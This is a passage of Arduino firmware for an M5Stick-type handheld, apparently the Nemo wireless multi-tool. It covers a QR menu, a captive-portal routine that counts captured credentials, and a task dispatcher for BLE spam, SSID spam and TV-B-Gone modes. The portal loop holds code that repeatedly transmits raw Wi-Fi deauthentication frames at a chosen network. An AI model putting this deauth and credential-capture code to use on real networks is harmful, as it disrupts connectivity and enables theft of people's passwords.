      current_proc = 1;
      isSwitching = true;
    }else if ( activeQR == false ) {
      activeQR = true;
      DISP.fillScreen(WHITE);
      DISP.qrcode(qrcodes[cursor].url, (DISP.width() - DISP.height()) / 2, 0, DISP.height(), 5);
      delay(500);
    } else {
      isSwitching = true;
      activeQR = false;
      delay(250);
    }
  }
}

/// NEMO PORTAL

void portal_setup(){
  setupWiFi();
  setupWebServer();
  portal_active = true;
  cursor = 0;
  rstOverride = true;
  printHomeToScreen();
  #if defined(DEAUTHER)                                                                      // DEAUTH
  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));                  // DEAUTH
  wsl_bypasser_send_deauth_frame(&ap_record, channel);                                       // DEAUTH  CREATE FRAME
  #endif                                                                                     // DEAUTH
  delay(500); // Prevent switching after menu loads up
}

void portal_loop(){
  if ((millis() - lastTick) > PortalTickTimer) {
    lastTick = millis();
    if (totalCapturedCredentials != previousTotalCapturedCredentials) {
      previousTotalCapturedCredentials = totalCapturedCredentials;
      printHomeToScreen();
    }
  }
  if (clone_flg==true) {
    #if defined(DEAUTHER)
      if (target_deauth_flg) {
        if (target_deauth == true) {                                                                 // DEAUTH
          if (deauth_tick==35) {                                                                     // 35 is +-100ms   (Add delay to attack, without reflection on portal)
            wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));                 // DEAUTH   SEND FRAME
            deauth_tick=0;
          } else { 
            deauth_tick=deauth_tick+1; 
          }
          DISP.setTextSize(SMALL_TEXT);                                                              // DEAUTH
          DISP.setTextColor(TFT_RED, BGCOLOR);                                                       // DEAUTH
          DISP.setCursor(1, 115);                                                                    // DEAUTH
          DISP.println(TXT_DEAUTH_STOP);                                                             // DEAUTH
          DISP.setTextColor(FGCOLOR, BGCOLOR);                                                       // DEAUTH
        } else{                                                                                      // DEAUTH
          DISP.setTextSize(SMALL_TEXT);                                                              // DEAUTH
          DISP.setTextColor(TFT_RED, BGCOLOR);                                                       // DEAUTH
          DISP.setCursor(1, 115);                                                                    // DEAUTH
          DISP.println(TXT_DEAUTH_START);                                                            // DEAUTH
          DISP.setTextColor(FGCOLOR, BGCOLOR);                                                       // DEAUTH
        }                                                                                            // DEAUTH
        if (check_select_press()){                                                                    // DEAUTH
          target_deauth = !target_deauth;                                                             // DEAUTH
          delay(500);                                                                                 // DEAUTH
        }
      }
    #endif
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
  
  if (check_next_press()){
    shutdownWebServer();
    portal_active = false;
    target_deauth_flg = false;                                                                     // DEAUTH
    target_deauth = false;                                                                         // DEAUTH
    clone_flg = false;                                                                             // DEAUTH
    current_proc = 12;
    delay(500);
  }
  check_select_press();
}

/// ENTRY ///
void setup() {
#if defined(CARDPUTER)
  auto cfg = M5.config();
  M5Cardputer.begin(cfg, true);
#else
  M5.begin();
#endif
#if defined(BACKLIGHT)
  pinMode(BACKLIGHT, OUTPUT); // Backlight analogWrite range ~150 - 255
#endif
  if(check_next_press()){
    clearSettings();
  }
  #if defined(USE_EEPROM)
    EEPROM.begin(EEPROM_SIZE);
    Serial.printf("EEPROM 0 - Rotation:   %d\n", EEPROM.read(0));
    Serial.printf("EEPROM 1 - Dim Time:   %d\n", EEPROM.read(1));
    Serial.printf("EEPROM 2 - Brightness: %d\n", EEPROM.read(2));
    Serial.printf("EEPROM 3 - TVBG Reg:   %d\n", EEPROM.read(3));
    Serial.printf("EEPROM 4 - FGColor:    %d\n", EEPROM.read(4));
    Serial.printf("EEPROM 5 - BGColor:    %d\n", EEPROM.read(5));
    if(EEPROM.read(0) > 3 || EEPROM.read(1) > 240 || EEPROM.read(2) > 100 || EEPROM.read(3) > 2 || EEPROM.read(4) > 19 || EEPROM.read(5) > 19) {
      // Assume out-of-bounds settings are a fresh/corrupt EEPROM and write defaults for everything
      Serial.println("EEPROM likely not properly configured. Writing defaults.");
      #if defined(CARDPUTER)
      EEPROM.write(0, 1);    // Right rotation for cardputer
      #else
      EEPROM.write(0, 3);    // Left rotation
      #endif
      EEPROM.write(1, 15);   // 15 second auto dim time
      EEPROM.write(2, 100);  // 100% brightness
      EEPROM.write(3, 0);    // TVBG NA Region
      EEPROM.write(4, 11);   // FGColor Green
      EEPROM.write(5, 1);    // BGcolor Black
      EEPROM.commit();
    }
    rotation = EEPROM.read(0);
    screen_dim_time = EEPROM.read(1);
    brightness = EEPROM.read(2);
    region = EEPROM.read(3);
    setcolor(true, EEPROM.read(4));
    setcolor(false, EEPROM.read(5));
  #endif
  getSSID();
  
  // Pin setup
#if defined(M5LED)
  pinMode(M5LED, OUTPUT);
  digitalWrite(M5LED, M5LED_OFF); //LEDOFF
#endif
#if defined(IRLED)
  pinMode(IRLED, OUTPUT);
  digitalWrite(IRLED, M5LED_OFF); //LEDOFF
#endif
#if !defined(KB)
  pinMode(M5_BUTTON_HOME, INPUT);
  pinMode(M5_BUTTON_RST, INPUT);
#endif
#if defined(M5_BUTTON_MENU)
  pinMode(M5_BUTTON_MENU, INPUT);
#endif
  // Random seed
  randomSeed(analogRead(0));

  // Create the BLE Server
  BLEDevice::init("");
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  // Nemo Portal Init
  setupSdCard();
  bootTime = lastActivity = millis();

  screenBrightness(brightness);
  dimtimer();
  DISP.setRotation(rotation);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  bootScreen();
}

void loop() {
  // This is the code to handle running the main loops
  // Background processes
  switcher_button_proc();
  screen_dim_proc();
  check_menu_press();
  
  // Switcher
  if (isSwitching) {
    isSwitching = false;
    Serial.printf("Switching To Task: %d\n", current_proc);
    switch (current_proc) {
#if defined(RTC)
      case 0:
        clock_setup();
        break;
#endif
      case 1:
        mmenu_setup();
        break;
      case 2:
        smenu_setup();
        break;
#if defined(RTC)
      case 3:
        timeset_setup();
        break;
#endif
      case 4:
        dmenu_setup();
        break;
      case 5:
        tvbgone_setup();
        break;
#if defined(AXP) || defined(PWRMGMT)
      case 6:
        battery_setup();
        break;
#endif
#if defined(CARDPUTER)
      case 6:
        battery_setup();
        break;
#endif
#if defined(ROTATION)
      case 7:
        rmenu_setup();
        break;
#endif
      case 8:
        aj_setup();
        break;
      case 9:
        aj_adv_setup();
        break;
      case 10:
        credits_setup();
        break;
      case 11:
        wifispam_setup();
        break;
      case 12:
        wsmenu_setup();
        break;
      case 13:
        tvbgmenu_setup();
        break;
      case 14:
        wscan_setup();
        break;
      case 15:
        wscan_result_setup();
        break;
      case 16:
        btmenu_setup();
        break;
      case 17:
        btmaelstrom_setup();
        break;
      case 18:
        qrmenu_setup();
        break;
      case 19:
        portal_setup();
        break;
            case 20:
        wsAmenu_setup();
        break;
      #if defined(DEAUTHER)
        case 21:
          deauth_setup();
          break;
      #endif
        case 22:
          color_setup();
          break;
        case 23:
          theme_setup();
          break;
    }
  }

  switch (current_proc) {
#if defined(RTC)
    case 0:
      clock_loop();
      break;
#endif
    case 1:
      mmenu_loop();
      break;
    case 2:
      smenu_loop();
      break;
#if defined(RTC)
    case 3:
      timeset_loop();
      break;
#endif
    case 4:
      dmenu_loop();
      break;
    case 5:
      tvbgone_loop();
      break;
#if defined(AXP) || defined(PWRMGMT)
    case 6:
      battery_loop();
      break;
#endif
#if defined(CARDPUTER)
    case 6:
      battery_loop();
      break;
#endif
#if defined(ROTATION)
    case 7:
      rmenu_loop();
      break;
#endif
    case 8:
      aj_loop();
      break;
    case 9:
      aj_adv();
      break;
    case 10:
      credits_loop();
      break;
    case 11:
      wifispam_loop();
      break;
    case 12:
      wsmenu_loop();
      break;
    case 13:
      tvbgmenu_loop();
      break;
    case 14:
      wscan_loop();
      break;
    case 15:
      wscan_result_loop();
      break;
    case 16:
      btmenu_loop();
      break;
    case 17:
      btmaelstrom_loop();
      break;
    case 18:
      qrmenu_loop();
      break;
    case 19:
      portal_loop();
      break;
    case 20:
      wsAmenu_loop();
      break;
    #if defined(DEAUTHER)                                             // DEAUTH
      case 21:
        deauth_loop();                                                // DEAUTH
        break;                                                        // DEAUTH
    #endif                                                            // DEAUTH
      case 22:
        color_loop();
        break;
      case 23:
        theme_loop();
        break;
    #if defined(SDCARD)                                                // SDCARD M5Stick
      #ifndef CARDPUTER                                                // SDCARD M5Stick
        case 97:
          ToggleSDCard();                                              // SDCARD M5Stick
          break;                                                       // SDCARD M5Stick
      #endif                                                           // SDCARD M5Stick
    #endif                                                             // SDCARD M5Stick
  }
}
